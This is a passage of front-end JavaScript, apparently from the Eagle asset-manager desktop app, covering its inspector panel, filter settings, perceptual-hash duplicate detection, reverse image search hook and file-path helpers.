class Inspector {
    
    #isHideInspector;
    #width;

	constructor() {
        this.#isHideInspector = localStorage["eagle.inspector.isHideInspector"] === 'true';
        this.#width = (localStorage["eagle.containerSize.inspector"])? parseInt(localStorage["eagle.containerSize.inspector"]) : 240;
        this.newName = "";
        this.newUrl = "";
        this.newTags = [];
        this.newNamePlaceholder = "title";
        this.newUrlPlaceholder = "http://";
        this.folders = [];
        this.activeTab = 'ITEM';
        this.inspectorFolder = undefined;
        this.category = {
            newName: "",
            newDescription: "",
            createDate: "",
            imageCount: 0,
            fileSize: 0,
            exportable: false,
            editable: false
        };
        this.sortableOptions = {
            distance: 10,
            disabled: false,
			helper : 'clone',
            update: (e, ui) => {
                setTimeout(() => {
                    if (this.inspectorItems && this.inspectorItems.length > 0) {
                        let inspectorItemsOrder = {};
                        this.inspectorItems.forEach((item, index) => {
                            inspectorItemsOrder[item.id] = index;
                        });
                        localStorage.setItem("eagle.inspector.itemsOrder", JSON.stringify(inspectorItemsOrder));
                    }
                }, 1);
            },
        };
        this.inspectorItems = [];
        this.inspectorItemsOrder = localStorage["eagle.inspector.itemsOrder"] ? JSON.parse(localStorage["eagle.inspector.itemsOrder"]) : { tags: 0, folders: 1, annotations: 2, information: 100 };
	}

    initPlugins() {
        const inspectorPlugins = pluginModule.previewExtension.inspectorPlugins;
        const pluginItems = inspectorPlugins.map((plugin) => {
            return {
                type: "plugin",
                id: plugin?.manifest?.id,
                name: plugin?.manifest?.name,
                plugin: plugin,
            }
        });

        this.inspectorItems = [
            { id: "tags" ,name: i18n.__("inspector.includesTagsLabel"), type: "tags" },
            { id: "folders", name: i18n.__("inspector.includesFoldersLabel"), type: "folders" },
            { id: "annotations", name: i18n.__("inspector.annotationLabel"), type: "annotations" },
            ...pluginItems,
            { id: "information", name: i18n.__("inspector.infoLabel"), type: "information" },
        ];

        this.inspectorItems.sort((a, b) => {
            const aOrder = this.inspectorItemsOrder[a.id] ?? 3;
            const bOrder = this.inspectorItemsOrder[b.id] ?? 3;
            return aOrder - bOrder;
        });
    }

    reset() {
        this.inspectorFolder = undefined;
    }

    toggle() {
        this.isHideInspector = !this.isHideInspector;
        setTimeout(() => {
            $bodyScope.whenLayoutChange();
            $bodyScope.$evalAsync();
        }, 100);
        if (eagle.inspector.isHideInspector) { electronLog && electronLog.info("[app] Inspector: OFF"); }
        else { electronLog && electronLog.info("[app] Inspector: ON"); }
    }

    copyTags(tags) {
        tags = tags ?? this.newTags;
        if (tags?.length > 0) {
            this.copiedTags = tags;
            clipboard.writeText(this.copiedTags.join("\n"));
        }
    }

    calculateTags(images) {

        if (images.length == 1) return images[0].tags;

        var board = {}; // Ó‹·Ö±í
        var tags = [];
        images.forEach(function(image) {
            if (image && image.tags) {
                image.tags.forEach(function(tag) {
                    if (!board[tag]) {
                        board[tag] = 1;
                    } else {
                        board[tag] = board[tag] + 1;
                    }
                });
            }
        });
        Object.keys(board).forEach(function(key) {
            if (board[key] == images.length) {
                tags.push(key);
            }
        });
        return tags;
    }

    calculateFolders(images) {
        var board = {}; // Ó‹·Ö±í
        var folders = [];
        images.forEach(function(image) {
            if (!image || !image.folders) return;
            image.folders.forEach(function(folder) {
                if (!board[folder]) {
                    board[folder] = 1;
                } else {
                    board[folder] = board[folder] + 1;
                }
            });
        });
        Object.keys(board).forEach(function(key) {
            if (board[key] == images.length) {
                folders.push(key);
            }
        });
        return folders;
    }

    calculateName(images) {
        var name = images[0].name;
        for (var i = 1; i < images.length; i++) {
            var image = images[i];
            if (name !== image.name) {
                return "";
            }
        }
        return name;
    }
    
    calculateUrl(images) {
        var url = images[0].url;
        for (var i = 1; i < images.length; i++) {
            var image = images[i];
            if (url !== image.url) {
                return "";
            }
        }
        return url;
    }

    calculateAnnotation(images) {
        var annotation = images[0].annotation;
        for (var i = 1; i < images.length; i++) {
            var image = images[i];
            if (annotation !== image.annotation) {
                return "";
            }
        }
        return annotation;
    }

    calculateStar(images) {
        var star = images[0].star;
        for (var i = 1; i < images.length; i++) {
            var image = images[i];
            if (star !== image.star) {
                return 0;
            }
        }
        return star;
    }

    calculateFileSize(images) {
        var total = 0;
        try {
            for (var i = 0; i < images.length; i++) {
                var image = images[i];
                if (image && image.size) {
                    total += parseInt(image.size);
                }
            }
        }
        catch (err) {
            return 0;
        }
        return total;
    }

    get isHideInspector() {
        return this.#isHideInspector;
    }

    set isHideInspector(value) {
        this.#isHideInspector = value;
        localStorage.setItem("eagle.inspector.isHideInspector", value);
    }

    get width() {
        return this.#width;
    }

    set width(value) {
        if (isNaN(value)) return;
        this.#width = value;
        localStorage.setItem("eagle.containerSize.inspector", value);
    }

    get showProperties() {
        return localStorage['eagle.inspector.showProperties'] !== 'false';
    }
    set showProperties(value) {
        localStorage['eagle.inspector.showProperties'] = value;
    }

    get showComments() {
        return localStorage['eagle.inspector.showComments'] !== 'false';
    }
    set showComments(value) {
        localStorage['eagle.inspector.showComments'] = value;
    }

    get showFolders() {
        return localStorage['eagle.inspector.showFolders'] !== 'false';
    }
    set showFolders(value) {
        localStorage['eagle.inspector.showFolders'] = value;
    }

    get showTags() {
        return localStorage['eagle.inspector.showTags'] !== 'false';
    }
    set showTags(value) {
        localStorage['eagle.inspector.showTags'] = value;
    }

}

eagle.inspector = new Inspector();
class ItemFilter {
    #isOpen;
	constructor() {
        this.#isOpen = localStorage['isOpenFilter']  === 'true';
        this.isLockFilter = false;

        // 預設計數
        this.defaultCounts = {
            type: {},
            rating: {
                '1': 0,
                '2': 0,
                '3': 0,
                '4': 0,
                '5': 0,
                '0': 0,
            },
            shape: {
                'panoramic-landscape': 0,
                'landscape': 0,
                'panoramic-portrait': 0,
                'portrait': 0,
                'square': 0,
                '4:3': 0,
                '3:4': 0,
                '16:9': 0,
                '9:16': 0,
            },
            import: {
                'today': 0,
                'yesterday': 0,
                '7day': 0,
                '30day': 0,
                '90day': 0,
                '365day': 0,
                "year/month": {},
            },
            mtime: {
                'today': 0,
                'yesterday': 0,
                '7day': 0,
                '30day': 0,
                '90day': 0,
                '365day': 0,
                "year/month": {},
            },
            camera: {},
            fontActivated: {
                'activated': 0,
                'deactivated': 0,
            }
        };
        this.filterCounts = {};
        this.resetFilterCounts();

        // 預設條件
        this.defaultRules = {
            type: {},
            tag: {
                no: false,
                includes: [],
                exclude: [],
            },
            folder: {
                includes: {},
                exclude: {},
            },
            font: {
                activated: false,
                deactivated: false,
            },
            camera: {},
            import: {
                today: false,
                yesterday: false,
                last7day: false,
                last30day: false,
                last90day: false,
                last365day: false,
                usingRange: false,
                range: undefined,
                type: "undefined",
                model: undefined,
                selectedMonths: {},
            },
            mtime: {
                today: false,
                yesterday: false,
                last7day: false,
                last30day: false,
                last90day: false,
                last365day: false,
                usingRange: false,
                type: "undefined",
                model: undefined,
                selectedMonths: {},
            },
            rating: {
                '1': false,
                '2': false,
                '3': false,
                '4': false,
                '5': false,
                '0': false,
            },
            color: {
                gray: false,
                value: undefined,
                accuracy: 20
            },
            shape: {
                portrait: false,
                landscape: false,
                square: false,
                panoramicPortrait: false,
                panoramicLandscape: false,
                '43': false,
                '34': false,
                '169': false,
                '916': false,
                custom: false,
                width: 4,
                height: 3,
            },
            resolution: {
                minW: undefined,
                maxW: undefined,
                minH: undefined,
                maxH: undefined
            },
            file: {
                min: undefined,
                max: undefined,
                unit: 'kb',
            },
            duration: {
                min: undefined,
                max: undefined,
                unit: 's',
            },
            bpm: {
                min: undefined,
                max: undefined
            },
            annotation: {
                has: false,
                no: false,
                keywords: undefined
            },
            note: {
                has: false,
                no: false,
                keywords: undefined
            },
            url: {
                has: false,
                no: false,
                keywords: undefined
            },
        };
        this.filterRules = {};
        this.resetFilterRules();

        this.initPinned();

        // 工具列
        this.toolbar = [
            { type: 'color' },
            { type: 'tags' },
            { type: 'folders' },
            { type: 'shape' },
            { type: 'rating' },
            { type: 'types' },
            { type: 'import' },
            { type: 'mtime' },
            { type: 'resolution' },
            { type: 'duration' },
            { type: 'size' },
            { type: 'annotation' },
            { type: 'note' },
            { type: 'url' },
            { type: 'fontActivated' },
            { type: 'bpm' },
            { type: 'camera' },
        ];
        this.toolbarMap = {};
        this.toolbarSortableOptions = {
            distance: 10,
            disabled: false,
			helper : 'clone',
            update: (e, ui) => {
                setTimeout(() => {
                    console.log(this.toolbar);
                    if (this.toolbar && this.toolbar.length > 0) {
                        let toolbarOrders = [];
                        this.toolbar.forEach((item) => {
                            toolbarOrders.push(item.type);
                        });
                        localStorage.setItem("eagle.filter.toolbar.orders", JSON.stringify(toolbarOrders));
                    }
                }, 1);
            },
        };
        this.tagFilterLogic = "OR";
        this.folderFilterLogic = "OR";

        // 記錄支援的篩選格式
        this.filterExtensions = {};

        // 資料夾篩選關鍵字
        this.filterFolderKeyword = "";

        // 相機篩選條件
        this.filterCameras = [];
        this.filterCamerasMapping = {};
        this.initOrders();

        // 格式篩選條件
        this.buildInTypes = ['font','video','audio', 'youtube','vimeo','bilibili'];
        this.filterTypes = [];

        // 篩選器計數
        this.filterBadge = 0;
	}

    resetFilterRules() {
        this.filterRules = JSON.parse(JSON.stringify(this.defaultRules));
    }

    resetFilterCounts() {
        this.filterCounts = JSON.parse(JSON.stringify(this.defaultCounts));
    }

    initPinned() {
        const defaultPinned = {
            color: true,
            tags: true,
            folders: true,
            shape: true,
            rating: true,
            types: true,
            import: false,
            mtime: false,
            resolution: false,
            duration: false,
            size: false,
            annotation: false,
            note: false,
            url: false,
            fontActivated: false,
            bpm: false,
            camera: false,
        };
        let pinned = localStorage.getItem('eagle.filter.toolbar.pinned');
        if (pinned) {
            try {
                pinned = JSON.parse(pinned);
            }
            catch (err) {
                pinned = defaultPinned;
            }
        }
        else {
            pinned = defaultPinned;
        }
        this.pinned = pinned;
    }       

    savePinned() {
        localStorage.setItem('eagle.filter.toolbar.pinned', JSON.stringify(this.pinned));
    }

    initOrders() {
        const defaultOrders = [
            'color',
            'tags',
            'folders',
            'shape',
            'rating',
            'types',
            'resolution',
            'duration',
            'size',
            'annotation',
            'note',
            'url',
            'import',
            'mtime',
            'fontActivated',
            'bpm',
            'camera'
        ];
        var filterToolbarOrders = localStorage.getItem("eagle.filter.toolbar.orders");
        if (filterToolbarOrders) {
            try {
                filterToolbarOrders = JSON.parse(filterToolbarOrders);
            }
            catch (err) {
                filterToolbarOrders = defaultOrders;
            }
        }
        else {
            filterToolbarOrders = defaultOrders;
        }

        if (filterToolbarOrders.length > 0) {
            var filterToolbarOrdersIndexMap = {};
            
            filterToolbarOrders.forEach((item, index) => {
                filterToolbarOrdersIndexMap[item] = index;
            });

            this.toolbar = this.toolbar.sort((a, b) => filterToolbarOrdersIndexMap[a.type] - filterToolbarOrdersIndexMap[b.type]);

            // set toolbar map
            this.toolbar.forEach((item) => {
                this.toolbarMap[item.type] = item;
            });
        }


        this.filterToolbarOrders = filterToolbarOrders;
    }

    get isOpen() {
        return this.#isOpen;
    }
    set isOpen(value) {
        this.#isOpen = value;
        localStorage["isOpenFilter"] = value;
    }
}

eagle.filter = new ItemFilter();
class DuplicateChecker {

    async initFingerprintMap(items, fingerprintMap, onProgress, cancelToken) {
        return new Promise((resolve) => {
            let current = 0;
            let total = items.length;

            // 如果 fingerprintMap 是空的，才進行計算
            if (Object.keys(fingerprintMap).length === 0) {
                const startTime = Date.now();
                const async = require('async');
                let queue = async.queue((item, callback) => {
                    (async () => {
                        try {
                            if (cancelToken.isCancelled()) {
                                return callback();
                            }

                            let fileURL;
                            if (item.noThumbnail) {
                                fileURL = FileUrlHelper.getRawUrl(item);
                            }
                            else {
                                fileURL = FileUrlHelper.getThumbnailUrl(item);
                            }
                            const fingerprint = await Phash.getFingerprint(fileURL);
                            if (fingerprint) {
                                fingerprintMap[item.id] = fingerprint;
                            }
                            current++;
                            onProgress && onProgress(current, total);
                        }
                        catch (err) {
                            console.log(err);
                        }
                        callback();
                    })();
                }, 8);

                queue.drain = () => {
                    console.log(`avg time each item: ${(Date.now() - startTime) / total} items/s`);
                    resolve();
                };

                queue.push(items);
            }
            else {
                resolve();
            }
        });
    }

    async findSimilarFiles(items, cancelToken, options = { fingerprintWeighted: 0.8, fingerprintMap: undefined, onProgress: undefined }) {
        return new Promise(async (resolve) => {
            let onProgress = options.onProgress;

            // 篩選掉不支援的格式，目前僅支援 jpg png jpeg webp avif bmp
            // 篩選掉檔案大小 > 50MB 的檔案
            const MB_50 = 1024 * 1024 * 50;
            const cloneItems = items.filter((item) => {
                const SUPPORT_FORMATS = {
                    "jpg": true,
                    "png": true,
                    "jpeg": true,
                    "webp": true,
                    "avif": true,
                    "bmp": true,
                };
                return SUPPORT_FORMATS[item.ext];
            }).filter((item) => {
                return item.size < MB_50;
            });

            // 計算所有圖片的 phash
            const fingerprintMap = options.fingerprintMap || {};

            if (cloneItems.length === 0) {
                return resolve({
                    groups: [],
                    fingerprintMap: {},
                });
            }
            
            await this.initFingerprintMap(cloneItems, fingerprintMap, onProgress, cancelToken);

            if (cancelToken.isCancelled()) {
                console.log("cancel");
                return {
                    cancel: true,
                    groups: [],
                    fingerprintMap: {},
                }
            };

            const numWorkers = Math.min(4, Math.ceil(cloneItems.length / 3000));
            const workers = [];
            const workerResults = [];
            const addedItemMap = {};

            for (let i = 0; i < numWorkers; i++) {
                workers[i] = new Worker('js/workers/calHammingDistance.js');

                const partItems = cloneItems.slice(i * cloneItems.length / numWorkers, (i + 1) * cloneItems.length / numWorkers);
                workers[i].postMessage({all: cloneItems, part: partItems, fingerprintMap, fingerprintWeighted: options.fingerprintWeighted});

                workers[i].onmessage = function(event) {

                    workers[i].terminate();

                    workerResults[i] = {
                        groups: event.data
                    };

                    if (workerResults.filter(Boolean).length === numWorkers) {

                        let result = {
                            groups: [],
                            fingerprintMap: fingerprintMap,
                        };

                        workerResults.forEach((workerResult) => {
                            workerResult.groups.forEach((group) => {
                                if (addedItemMap[group.id]) return;
                                group.items = [...new Set(group.items)];
                                addedItemMap[group.id] = true;
                                result.groups.push({
                                    id: crypto.randomUUID(),
                                    items: group.items,
                                });
                            });
                        });

                        result.groups = result.groups.filter((group) => {
                            return group.items.length > 1;
                        });
                        
                        console.log(result);
                        return resolve(result);
                    }
                };

                workers[i].onerror = function(error) {
                    console.error('Worker error: ', error);
                };
            }
        });
    }

    //   找到相同的文件
    async findDuplicateFiles(items, cancelToken, options) {
        const crypto = require("crypto");
        const readChunk = require('read-chunk');
        const chunkSize = 1024 * 4;
        let result = [];
        let sizeMap = {};
        let total = items.length;
        let current = 0;
        let onProgress = options.onProgress;

        try {
            for (let item of items) {
                if (item.size === 0) continue;
                const size = item.size;
                if (sizeMap[size]) {
                    sizeMap[size].push(item);
                } else {
                    sizeMap[size] = [item];
                }
            }

            for (let [size, items] of Object.entries(sizeMap)) {
                if (cancelToken.isCancelled()) break;
                if (items.length < 2) {
                    current += items.length;
                    onProgress && onProgress(current, total);
                    continue;
                }
                const md5Map = {};
                for await (const item of items) {
                    if (cancelToken.isCancelled()) break;
                    // for (let item of items) {
                    try {
                        const filePath = FileUrlHelper.getRawPath(item);
                        const itemSize = parseInt(item.size);
                        let md5 = "";
                        if (chunkSize > itemSize) {
                            const buffer = await readChunk(filePath, 0, itemSize);
                            md5 = crypto.createHash("md5").update(buffer).digest("hex");
                        }
                        else {
                            const headBuffer = await readChunk(filePath, 0, chunkSize);
                            const bodyBuffer = await readChunk(filePath, Math.floor((size - chunkSize) / 2), chunkSize);
                            const tailBuffer = await readChunk(filePath, size - chunkSize, chunkSize);
                            const mergeBuffer = Buffer.concat([headBuffer, bodyBuffer, tailBuffer]);
                            md5 = crypto.createHash("md5").update(mergeBuffer).digest("hex");
                        }
                            

                        if (md5Map[md5]) {
                            md5Map[md5].push(item);
                        } else {
                            md5Map[md5] = [item];
                        }
                        current += 1;
                        onProgress && onProgress(current, total);
                    }
                    catch (err) {
                        console.log(err);
                    }
                }

                for (let items of Object.values(md5Map)) {
                    if (items.length < 2) continue;
                    result.push({
                        id: crypto.randomUUID(),
                        items: items
                    });
                }
            }
        }
        catch (err) {
            electronLog.error(err);
        }

        if (cancelToken.isCancelled()) {
            console.log("cancel");
            return {
                cancel: true,
                groups: [],
            }
        };

        return {
            groups: result
        };
    }
}

class Phash {
    static ExpectImgSize = 40;
    static SamplingRadio = 4;
    static DCTScale = 2;

    static async getImageUrl(file) {
        return new Promise((resolve) => {
            const reader = new FileReader();
            reader.readAsDataURL(file);
            reader.onload = async function (e) {
                resolve(e.target.result);
            };
        });
    }

    static async getImageData(src) {
        return new Promise((resolve) => {
            const canvas = document.createElement("canvas");
            const context = canvas.getContext("2d");
            canvas.width = Phash.ExpectImgSize;
            canvas.height = Phash.ExpectImgSize;

            const img = new Image();
            img.onload = function () {
                const _this = this;
                context.drawImage(_this, 0, 0, _this.width, _this.height, 0, 0, Phash.ExpectImgSize, Phash.ExpectImgSize);
                resolve(context.getImageData(0, 0, Phash.ExpectImgSize, Phash.ExpectImgSize));
            };
            img.onerror = function () {
                resolve(null);
            };
            img.src = src;
        });
    }

    static getGrayscale(origin) {
        const result = [];
        for (let n = 0; n < origin.data.length; n++) {
            if ((n + 1) % 4 === 0) {
                const R = origin.data[n - 3];
                const G = origin.data[n - 2];
                const B = origin.data[n - 1];
                const gray = R * 0.299 + G * 0.587 + B * 0.114;
                result.push(gray);
            }
        }
        return result;
    }

    static getDCT(colors) {
        const PI_N = Math.PI / colors.length;
        return colors.map((_, n) => {
            const num = Phash.DCTScale * colors.reduce((total, current, m) => total + current * Math.cos(PI_N * (m + 0.5) * n), 0);
            return Math.min(255, Math.max(0, num));
        });
    }

    static getLTCornerColors(colors) {
        const MatrixSize = Math.sqrt(colors.length);
        const SamplingSize = MatrixSize / Phash.SamplingRadio;
        const result = [];

        for (let i = 0; i < SamplingSize; i++) {
            result.push(...colors.slice(i * MatrixSize, i * MatrixSize + SamplingSize));
        }
        return result;
    }

    static getCosineSimilarity(origin, target) {
        let product = 0,
            vecA = 0,
            vecB = 0;
        for (let i = 0; i < origin.length; i++) {
            vecA += Math.pow(origin[i], 2);
            vecB += Math.pow(target[i], 2);
            product += origin[i] * target[i];
        }

        if (vecA === vecB) {
            return product / vecA;
        }

        return product / (Math.sqrt(vecA) * Math.sqrt(vecB));
    };

    static hammingDistance(string1, string2) {
        var xorResult = BigInt("0b" + string1) ^ BigInt("0b" + string2);
        var binary = xorResult.toString(2);
        var count = 0;
        for (var i = 0; i < binary.length; i++) {
            if (binary[i] === '1') {
                count++;
            }
        }
        return count;
    }

    static getFingerprint = async (filePath) => {
        const imgData = await Phash.getImageData(filePath);
        // 離散餘弦轉換
        const colors = Phash.getLTCornerColors(Phash.getDCT(Phash.getGrayscale(imgData)));
        // 均值化
        const average = colors.reduce((pre, cur) => pre + cur) / colors.length;
        // 二值化
        return colors.map((color) => (color >= average ? 1 : 0)).join("");
    };
}

eagle.duplicateChecker = new DuplicateChecker();
eagle.urlEnlargerRemote = {
    load: () =>{
        const scripts = [
            `https://oss-app.eagle.cool/js/url-enlarger.js?v=${Date.now()}`,
            'https://eagleapp.oss-cn-hongkong.aliyuncs.com/js/url-enlarger.js'
        ];

        function loadScript(index) {
            if (index >= scripts.length) return;

            const script = document.createElement('script');
            const src = scripts[index];
            script.src = src;
            script.onload = function() {
                console.log("remote rule loaded.");
            };
            script.onerror = function() {
                // Error occurred loading script. Load next one.
                console.log(`remote rule fail, ${src}`);
                loadScript(index + 1);
            };
            document.head.appendChild(script);
        }

        loadScript(0);
    }
}
class ReverseImageSearch {

    #pluginId = 'eagle-plugin-search-by-image';
    
    static ENGINES = {
        GOOGLE: 'google',
        YANDEX: 'yandex',
        BING: 'bing',
        TINEYE: 'tineye',
        BAIDU: 'baidu',
        SOGOU: 'sogou',
        SAUCENAO: 'saucenao'
    };

    search(item, searchEngine = 'google') {

        if (!item) return;

        if (!pluginModule.checkPluginInstalled(this.#pluginId)) {
            pluginModule.showInstallPluginDialog(this.#pluginId);
            return;
        }

        pluginModule.openPluginById(this.#pluginId, { searchEngine: searchEngine });
    }
}

eagle.reverseImageSearch = new ReverseImageSearch();
const junk = require(appRoot + '/my_modules/junk');
const EagleConfig = require(appRoot + '/config.js');

const moveToCursorPosition = ($elem) => {
    const windowWidth = $(window).width();
    const windowHeight = $(window).height();
    const containerWidth = $elem.width();
    const containerHeight = $elem.height();
    let x = windowMouseX + 10;
    let y = windowMouseY - 10;

    if (windowMouseX + containerWidth > windowWidth) {
        x = windowMouseX - containerWidth - 20;
        x = x < 20 ? 20 : x;
    }

    if (windowMouseY + containerHeight > windowHeight - 20) {
        y = windowHeight - containerHeight - 20;
        y = y < 20 ? 20 : y;
    }
    else if (windowMouseY - 56 < 0) {
        y = 36;
    }

    $elem.css({
        left: `${x}px`,
        top: `${y}px`,
    });
};

function isWindows11() {
    try {
        const version = /(\d+\.\d+)(?:\.(\d+))?/.exec(require("os").release());
        let ver = version[1] || '';
        const build = version[2] || '';
        return ver === '10.0' && build.startsWith('22');
    }
    catch (err) {
        return false;
    }
}

function fetchWrapper(url, options, timeout) {
    return new Promise((resolve, reject) => {
        fetch(url, options).then(resolve, reject);
        if (timeout) {
            const e = new Error("Connection timed out");
            setTimeout(reject, timeout, e);
        }
    });
}

function sortByAZ(arr) {
    var collator = new Intl.Collator(languageBCP || "en", { numeric: true, sensitivity: 'base' });
    arr = arr.sort(function (a, b) {
        return collator.compare(a.name, b.name);
    });
}

function getFilenameFromUrl(url) {
    try {
        if (url) {
            var str = url.toString();
            if (str.length > 1024) return "";
            var m = url.toString().match(/.*\/(.+?)\./);
            if (m && m.length > 1) {
                return m[1];
            }
        }
        return "";
    }
    catch (err) {
        return "";
    }
}

function getHashID(image, hasColorInfo) {
    var hashID = '';
    try {
        if (image) {
            if (image.name === i18n.__("general.untitled.title")) {
                return hashID;
            }
            
            // 本體不支原且也沒有插件支援
            if (!EagleConfig.SUPPORT_FORMATS[image.ext] && !pluginModule.previewExtension.thumbnailPluginMap[image.ext]) {
                return hashID;
            }

            // if (image && image.palettes) {
            switch (image.ext) {
                case 'svg':
                case 'tga':
                case 'bmp':
                case 'txt':
                    break;
                case 'url':
                    if (image.videoID) {
                        hashID = 'u-' + image.videoID;
                    }
                    else {
                        hashID = 'u-' + image.url;
                    }
                    break;
                case 'mp3':
                case 'wav':
                case 'ogg':
                case 'flac':
                case 'm4a':
                case 'aac':
                    if (!hasColorInfo) {
                        hashID = 'ad' + image.size + image.duration + image.ext;
                        if (image.bpm) {
                            hashID += image.bpm;
                        }
                    }
                    else if (image.bpm) {
                        hashID = 'ad' + image.size + image.duration + image.ext + image.name + image.bmp;
                    }
                    break;
                case 'pdf':
                    hashID = 'pdf-' + image.size + image.width + image.height;
                    break;
                case 'mov':
                case 'mp4':
                case 'webm':
                case 'mkv':
                case 'mpg':
                case 'avi':
                case 'm4v':
                case 'wmv':
                    hashID = 'v-' + image.size + image.duration;
                    break;
                case 'ttf':
                    var uniqueID = _.get(image, `fontMetas.uniqueID.en`, _.get(image, `fontMetas.uniqueID.zh`, _.get(image, `fontMetas.uniqueID.jp`, image?.fontMetas?.ID)));
                    if (!uniqueID) return undefined;
                    var postScriptName = _.get(image, `fontMetas.postScriptName.en`, _.get(image, `fontMetas.postScriptName.zh`, _.get(image, `fontMetas.postScriptName.jp`, undefined)));
                    var version = _.get(image, `fontMetas.version.en`, _.get(image, `fontMetas.version.zh`, _.get(image, `fontMetas.version.jp`, undefined)));
                    hashID = 'ttf-' + image.size + uniqueID + postScriptName + version;
                    break;
                case 'otf':
                    var uniqueID = _.get(image, `fontMetas.uniqueID.en`, _.get(image, `fontMetas.uniqueID.zh`, _.get(image, `fontMetas.uniqueID.jp`, image?.fontMetas?.ID)));
                    if (!uniqueID) return undefined;
                    var postScriptName = _.get(image, `fontMetas.postScriptName.en`, _.get(image, `fontMetas.postScriptName.zh`, _.get(image, `fontMetas.postScriptName.jp`, undefined)));
                    var version = _.get(image, `fontMetas.version.en`, _.get(image, `fontMetas.version.zh`, _.get(image, `fontMetas.version.jp`, undefined)));
                    hashID = 'otf-' + image.size + uniqueID + postScriptName + version;
                    break;
                case 'ttc':
                    var uniqueID = _.get(image, `fontMetas.uniqueID.en`, _.get(image, `fontMetas.uniqueID.zh`, _.get(image, `fontMetas.uniqueID.jp`, image?.fontMetas?.ID)));
                    if (!uniqueID) return undefined;
                    var postScriptName = _.get(image, `fontMetas.postScriptName.en`, _.get(image, `fontMetas.postScriptName.zh`, _.get(image, `fontMetas.postScriptName.jp`, undefined)));
                    var version = _.get(image, `fontMetas.version.en`, _.get(image, `fontMetas.version.zh`, _.get(image, `fontMetas.version.jp`, undefined)));
                    hashID = 'ttc-' + image.size + uniqueID + postScriptName + version;
                    console.log(hashID)
                    break;
                case 'woff':
                    var uniqueID = _.get(image, `fontMetas.uniqueID.en`, _.get(image, `fontMetas.uniqueID.zh`, _.get(image, `fontMetas.uniqueID.jp`, image?.fontMetas?.ID)));
                    if (!uniqueID) return undefined;
                    var postScriptName = _.get(image, `fontMetas.postScriptName.en`, _.get(image, `fontMetas.postScriptName.zh`, _.get(image, `fontMetas.postScriptName.jp`, undefined)));
                    var version = _.get(image, `fontMetas.version.en`, _.get(image, `fontMetas.version.zh`, _.get(image, `fontMetas.version.jp`, undefined)));
                    hashID = 'woff-' + image.size + uniqueID + postScriptName + version;
                    break;
                default:
                    if (hasColorInfo && image.palettes && image.palettes[0]) {

                        hashID = 'image-';

                        if (image.palettes[0]) {
                            hashID += (
                                new String(Math.ceil(image.palettes[0].color[0] / 10) * 10) +
                                new String(Math.ceil(image.palettes[0].color[1] / 10) * 10) +
                                new String(Math.ceil(image.palettes[0].color[2] / 10) * 10)
                            )
                        }

                        if (image.palettes[1]) {
                            hashID += (
                                new String(image.palettes[1].color[0]) +
                                new String(image.palettes[1].color[1]) +
                                new String(image.palettes[1].color[2])
                            )
                        }

                        if (image.palettes[2]) {
                            hashID += (
                                new String(image.palettes[2].color[0]) +
                                new String(image.palettes[2].color[1]) +
                                new String(image.palettes[2].color[2])
                            )
                        }

                        hashID += (image.size + '' + image.width + '' + image.height + '' + image.ext);
                    }
                    else if (hasColorInfo) {
                        const canGeneratePalette = (image, thumbnailSize) => {
                            if (!image || !thumbnailSize) { return false; }
                            var max = 30000000;
                            var sum = 0;
                            var newHeight = image.height / (image.width / thumbnailSize);
                            sum = newHeight * thumbnailSize;
                            return sum <= max;
                        }
                        // NOTE: 长图片没有进行颜色分析，所以只能额外做这个判断
                        if (!canGeneratePalette(image, 640)) {
                            return 'image-' + image.size + '' + image.width + '' + image.height + '' + image.ext;
                        }
                        return undefined;
                    }
                    else if (image.ext == "bmp") {
                        return undefined;
                    }
                    else {
                        hashID = 'image-' + image.size + '' + image.width + '' + image.height + '' + image.ext;
                    }

                // image.palettes.forEach(function (palette, index) {
                //     hashID = hashID + new String(
                //         Math.ceil( (palette.color[0] + palette.color[1] + palette.color[2] ) / 8 ) * 8 + '' +
                //         Math.round(palette.ratio*10)
                //     );
                // });
            }
        }
    }
    catch (err) {
    }
    return hashID;
};

function concatDakuten(str) {
    var table1 = ['が', 'ぎ', 'ぐ', 'げ', 'ご', 'ざ', 'じ', 'ず', 'ぜ', 'ぞ', 'だ', 'ぢ', 'づ', 'で', 'ど', 'ば', 'び', 'ぶ', 'べ', 'ぼ', 'ヴ', 'ガ', 'ギ', 'グ', 'ゲ', 'ゴ', 'ザ', 'ジ', 'ズ', 'ゼ', 'ゾ', 'ダ', 'ヂ', 'ヅ', 'デ', 'ド', 'バ', 'ビ', 'ブ', 'ベ', 'ボ', 'ぱ', 'ぴ', 'ぷ', 'ぺ', 'ぽ', 'パ', 'ピ', 'プ', 'ペ', 'ポ'];
    var table2 = ['が', 'ぎ', 'ぐ', 'げ', 'ご', 'ざ', 'じ', 'ず', 'ぜ', 'ぞ', 'だ', 'ぢ', 'づ', 'で', 'ど', 'ば', 'び', 'ぶ', 'べ', 'ぼ', 'ヴ', 'ガ', 'ギ', 'グ', 'ゲ', 'ゴ', 'ザ', 'ジ', 'ズ', 'ゼ', 'ゾ', 'ダ', 'ヂ', 'ヅ', 'デ', 'ド', 'バ', 'ビ', 'ブ', 'ベ', 'ボ', 'は', 'ひ', 'ぷ', 'ぺ', 'ぽ', 'パ', 'ピ', 'プ', 'ペ', 'ポ'];
    var i = 0,
        ii = table1.length;
    for (; i < ii; i++) {
        str = str.replace(new RegExp(table1[i], 'g'), table2[i]);
    }
    return str;
}

const URL_MODULE = require(appRoot + '/my_modules/url');
var FileUrlHelper = {
    getMetadataPath: function (image) {
        try {
            if (!image || !image.name) return "";
            return path.normalize(`${$bodyScope.libraryImagesPath}/${image.id}.info/metadata.json`);
        }
        catch (err) { }
    },
    getRawPath: function (image) {
        try {
            if (!image || !image.name) return "";
            let rawPath = path.normalize(`${$bodyScope.libraryImagesPath}/${image.id}.info/${image.name}.${image.ext}`);
            return rawPath;
        }
        catch (err) { }
    },
    getThumbnailPath: function (image) {
        try {
            if (!image || !image.name) return "";

            if (image.noThumbnail) {
                return FileUrlHelper.getRawPath(image);
            }

            let forceRaw = (image.ext === 'svg' && !image.forceThumbnail);

            if (forceRaw) {
                return FileUrlHelper.getRawPath(image);
            }
            else {
                let thumbnailPath = path.normalize(`${$bodyScope.libraryImagesPath}/${image.id}.info/${image.name}_thumbnail.png`);
                return thumbnailPath;
            }
        }
        catch (err) { }
    },
    getThumbnailUrl: function (image) {
        try {
            var thumbnailPath = FileUrlHelper.getThumbnailPath(image);
            return URL_MODULE.pathToFileURL(thumbnailPath).href;
        }
        catch (err) { }
    },
    getLastestThumbnailUrl: function (image) {
        try {
            let thumbnailUrl = FileUrlHelper.getThumbnailUrl(image);
            if ($bodyScope.modifiedMappings && $bodyScope.modifiedMappings[image.id]) {
